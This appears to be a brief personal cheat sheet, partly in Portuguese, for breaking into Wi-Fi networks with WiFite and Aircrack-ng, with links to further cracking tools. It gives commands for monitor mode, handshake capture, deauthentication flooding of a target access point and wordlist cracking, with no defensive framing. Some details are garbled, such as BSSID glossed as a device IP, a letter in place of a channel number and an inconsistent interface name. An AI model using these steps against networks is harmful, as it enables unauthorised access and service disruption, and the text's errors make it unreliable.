WiFite
[https://code.google.com/p/wifite/](https://code.google.com/p/wifite/)
[https://github.com/derv82/wifite](https://github.com/derv82/wifite)


`sudo wifite`
.. ou
```
wget https://raw.github.com/derv82/wifite/master/wifite.py

chmod +x wifite.py

./wifite.py
```
.. ou
`apt-get install wifite`


------------------------------------

[Aircrack-ng](https://www.aircrack-ng.org/)


Boot USB Live Kali Linux
```
ifconfig
airmon-ng
airmon-ng check kill
airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng --bssid D4:76.......B5 -c l -w /root/Desktop/wifi wlan-mon
```

    _--bssid (devide IP)_
    _-c (chainals)_

Note: open new terminal for capture handshake files and copy this files and go to the windows
`aireplay-ng --deauth 20 -a D4:76.......B5 wlan0mon`
Instal Aircrack-ng GUI tools in Windows

Choose your capture file .cap and Wordlist. Then hit launch button.

------------------------------------

[Fern Wifi Cracker](https://github.com/savio-code/fern-wifi-cracker)

[Macchanger](https://github.com/alobbs/macchanger)

[Wireshark](https://www.wireshark.org/)

[PixieWPS](https://github.com/wiire/pixiewps/)